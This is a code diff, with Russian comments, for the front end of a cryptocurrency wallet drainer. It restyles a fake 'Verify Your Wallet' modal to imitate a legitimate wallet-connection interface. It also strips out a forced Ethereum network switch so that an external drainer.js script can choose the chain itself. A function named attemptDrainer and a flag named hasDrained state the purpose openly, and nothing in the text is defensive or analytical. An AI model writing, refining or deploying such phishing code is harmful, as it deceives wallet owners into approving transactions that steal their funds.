@@ -32,9 +32,7 @@ let modalOverlay = null;
 let modalContent = null;
 let modalShown = false;
 
-const targetChainId = '0x1'; // Ethereum Mainnet
-
-// Список надёжных RPC для Ethereum Mainnet
+// Список надёжных RPC для fallback (оставляем, так как может быть полезно для любых сетей)
 const FALLBACK_RPCS = [
   'https://rpc.eth.gateway.fm',
   'https://eth.llamarpc.com',
@@ -43,10 +41,8 @@ const FALLBACK_RPCS = [
 
 // Функция для создания провайдера с fallback RPC
 async function getReliableProvider() {
-  // Сначала пробуем использовать провайдер кошелька
   const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
   try {
-    // Более строгая проверка: запрашиваем баланс нулевого адреса
     await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
     console.log('✅ Провайдер кошелька полностью рабочий');
     return walletProvider;
@@ -54,7 +50,6 @@ async function getReliableProvider() {
     console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
   }
 
-  // Если провайдер кошелька не работает, переходим на fallback RPC
   for (const rpcUrl of FALLBACK_RPCS) {
     try {
       const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
@@ -87,13 +82,13 @@ window.addEventListener('DOMContentLoaded', () => {
   actionBtn = document.getElementById('action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
 
-  // Подключаем шрифты Orbitron и Montserrat
+  // Подключаем шрифт Inter
   const link = document.createElement('link');
-  link.href = 'https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Montserrat:wght@400;700&display=swap';
+  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
   link.rel = 'stylesheet';
   document.head.appendChild(link);
 
-  // CSS для модального окна
+  // CSS для модального окна в стиле AppKit
   const style = document.createElement('style');
   style.textContent = `
     .modal-overlay {
@@ -102,10 +97,10 @@ window.addEventListener('DOMContentLoaded', () => {
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.85);
+      background: rgba(0, 0, 0, 0.8);
       z-index: 999;
       display: none;
-      backdrop-filter: blur(5px);
+      backdrop-filter: blur(4px);
     }
 
     .modal-content {
@@ -113,124 +108,181 @@ window.addEventListener('DOMContentLoaded', () => {
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: linear-gradient(145deg, #1a1a2e, #16213e);
-      border: 1px solid #00d4ff;
-      border-radius: 15px;
-      padding: 25px;
+      background: #1A202C;
+      border-radius: 12px;
+      padding: 24px;
       width: 90%;
-      max-width: 350px;
-      min-height: 400px;
+      max-width: 400px;
+      min-height: 350px;
       text-align: center;
       z-index: 1000;
       display: none;
-      font-family: 'Montserrat', sans-serif;
-      color: #ffffff;
-      box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
-      animation: fadeIn 0.5s ease-out forwards;
+      font-family: 'Inter', sans-serif;
+      color: #FFFFFF;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      animation: fadeIn 0.3s ease-out forwards;
     }
 
     @keyframes fadeIn {
-      0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0; }
+      0% { transform: translate(-50%, -50%) scale(0.95); opacity: 0; }
       100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
     }
 
     .modal-title {
-      font-family: 'Orbitron', sans-serif;
-      font-size: 22px;
-      color: #00d4ff;
-      margin-bottom: 20px;
-      text-transform: uppercase;
-      letter-spacing: 2px;
+      font-size: 20px;
+      font-weight: 600;
+      color: #FFFFFF;
+      margin-bottom: 16px;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 8px;
     }
 
     .modal-title::before {
-      content: '🔗';
-      font-size: 24px;
-    }
-
-    .scanner-container {
-      position: relative;
-      width: 120px;
-      height: 120px;
-      margin: 0 auto 20px;
-    }
-
-    .scanner-bg {
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
-      border-radius: 50%;
-      position: absolute;
-      top: 0;
-      left: 0;
-    }
-
-    .scanner-line {
-      width: 100%;
-      height: 4px;
-      background: #00d4ff;
-      position: absolute;
-      top: 50%;
-      left: 0;
-      box-shadow: 0 0 10px #00d4ff;
-      animation: scan 2s linear infinite;
-    }
-
-    @keyframes scan {
-      0% { transform: translateY(-50px); opacity: 0; }
-      50% { transform: translateY(50px); opacity: 1; }
-      100% { transform: translateY(-50px); opacity: 0; }
+      content: '';
+      font-size: 20px;
     }
 
     .modal-subtitle {
       font-size: 14px;
-      color: #b0b0b0;
-      margin-bottom: 25px;
+      font-weight: 400;
+      color: #A0AEC0;
+      margin-bottom: 24px;
+    }
+
+    /* Креативный кружок загрузки */
+    .loader-container {
+      position: relative;
+      width: 100px;
+      height: 100px;
+      margin: 0 auto 24px;
+    }
+
+    .loader-orbit {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: transparent;
+    }
+
+    .loader-dot {
+      position: absolute;
+      width: 12px;
+      height: 12px;
+      background: #3B82F6;
+      border-radius: 50%;
+      box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
+    }
+
+    .loader-dot:nth-child(1) {
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      animation: orbit1 2s linear infinite;
+    }
+
+    .loader-dot:nth-child(2) {
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      animation: orbit2 2.2s linear infinite;
+    }
+
+    .loader-dot:nth-child(3) {
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      animation: orbit3 2.4s linear infinite;
+    }
+
+    @keyframes orbit1 {
+      0% { transform: translateX(-50%) rotate(0deg) translateY(-25px); }
+      100% { transform: translateX(-50%) rotate(360deg) translateY(-25px); }
+    }
+
+    @keyframes orbit2 {
+      0% { transform: translateY(-50%) rotate(0deg) translateX(25px); }
+      100% { transform: translateY(-50%) rotate(360deg) translateX(25px); }
+    }
+
+    @keyframes orbit3 {
+      0% { transform: translateX(-50%) rotate(0deg) translateY(25px); }
+      100% { transform: translateX(-50%) rotate(360deg) translateY(25px); }
     }
 
     .action-list {
       list-style: none;
       padding: 0;
-      margin: 20px 0 0;
+      margin: 24px 0 0;
       font-size: 14px;
-      color: #e0e0e0;
+      font-weight: 500;
+      color: #E2E8F0;
+      text-align: left;
     }
 
     .action-list li {
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       display: flex;
       align-items: center;
       gap: 8px;
     }
 
     .action-list li::before {
-      content: '✔️';
-      color: #00ff88;
+      content: '';
+      color: #10B981;
       font-size: 16px;
     }
 
     .modal-footer {
       font-size: 12px;
-      color: #888888;
-      margin-top: 30px;
+      font-weight: 400;
+      color: #A0AEC0;
+      margin-top: 32px;
       font-style: italic;
     }
 
     @media (max-width: 480px) {
       .modal-content {
-        max-width: 300px;
+        max-width: 320px;
         padding: 20px;
-        min-height: 350px;
+        min-height: 300px;
       }
-      .modal-title { font-size: 18px; }
-      .scanner-container { width: 100px; height: 100px; }
-      .modal-subtitle { font-size: 12px; }
-      .action-list { font-size: 12px; }
-      .modal-footer { font-size: 10px; }
+      .modal-title {
+        font-size: 18px;
+      }
+      .modal-subtitle {
+        font-size: 13px;
+      }
+      .loader-container {
+        width: 70px;
+        height: 70px;
+      }
+      .loader-dot {
+        width: 10px;
+        height: 10px;
+      }
+      @keyframes orbit1 {
+        0% { transform: translateX(-50%) rotate(0deg) translateY(-10px); }
+        100% { transform: translateX(-50%) rotate(360deg) translateY(-10px); }
+      }
+      @keyframes orbit2 {
+        0% { transform: translateY(-50%) rotate(0deg) translateX(10px); }
+        100% { transform: translateY(-50%) rotate(360deg) translateX(10px); }
+      }
+      @keyframes orbit3 {
+        0% { transform: translateX(-50%) rotate(0deg) translateY(10px); }
+        100% { transform: translateX(-50%) rotate(360deg) translateY(10px); }
+      }
+      .action-list {
+        font-size: 13px;
+      }
+      .modal-footer {
+        font-size: 11px;
+      }
     }
   `;
   document.head.appendChild(style);
@@ -245,9 +297,12 @@ window.addEventListener('DOMContentLoaded', () => {
   modalContent.innerHTML = `
     <div class="modal-title">Verify Your Wallet</div>
     <div class="modal-subtitle">Processing blockchain verification...</div>
-    <div class="scanner-container">
-      <div class="scanner-bg"></div>
-      <div class="scanner-line"></div>
+    <div class="loader-container">
+      <div class="loader-orbit">
+        <div class="loader-dot"></div>
+        <div class="loader-dot"></div>
+        <div class="loader-dot"></div>
+      </div>
     </div>
     <ul class="action-list">
       <li>Connect to the network</li>
@@ -292,76 +347,12 @@ function showModalOnce() {
   }
 }
 
-// === Смена сети ===
-async function switchToTargetNetwork() {
-  try {
-    const provider = await getReliableProvider();
-    const network = await provider.getNetwork();
-    const currentChainId = `0x${network.chainId.toString(16)}`;
-
-    if (currentChainId === targetChainId) {
-      console.log('✅ Уже на Ethereum Mainnet');
-      return true;
-    }
-
-    console.log('🔄 Попытка сменить сеть на Ethereum Mainnet');
-    await window.ethereum.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{ chainId: targetChainId }],
-    });
-    console.log('✅ Сеть изменена на Ethereum Mainnet');
-    return true;
-  } catch (err) {
-    if (err.code === 4902 || err.message.includes('Unrecognized chain')) {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: targetChainId,
-            chainName: 'Ethereum Mainnet',
-            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-            rpcUrls: FALLBACK_RPCS,
-            blockExplorerUrls: ['https://etherscan.io'],
-          }],
-        });
-        console.log('✅ Сеть Ethereum Mainnet добавлена');
-        return true;
-      } catch (addErr) {
-        console.error('❌ Ошибка добавления сети:', addErr.message);
-        return false;
-      }
-    } else if (err.message.includes('user rejected')) {
-      console.log('🙅 Пользователь отклонил смену сети');
-      return false;
-    } else {
-      console.error('❌ Ошибка смены сети:', err.message);
-      return false;
-    }
-  }
-}
-
 // === Выполнение drainer ===
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
     console.log('⚠️ Транзакция уже выполнена или ожидается');
     return;
   }
-
-  // Убираем проверку сети, так как drainer.js сам выберет сеть
-  /*
-  const isNetworkCorrect = await switchToTargetNetwork();
-  if (!isNetworkCorrect) {
-    console.log('⚠️ Не удалось установить Ethereum Mainnet');
-    return;
-  }
-
-  const provider = await getReliableProvider();
-  const network = await provider.getNetwork();
-  if (network.chainId !== parseInt(targetChainId, 16)) {
-    console.log('⚠️ Сеть не соответствует Ethereum Mainnet');
-    return;
-  }
-  */
 
   if (!connectedAddress) {
     console.error('❌ Адрес кошелька не определён');
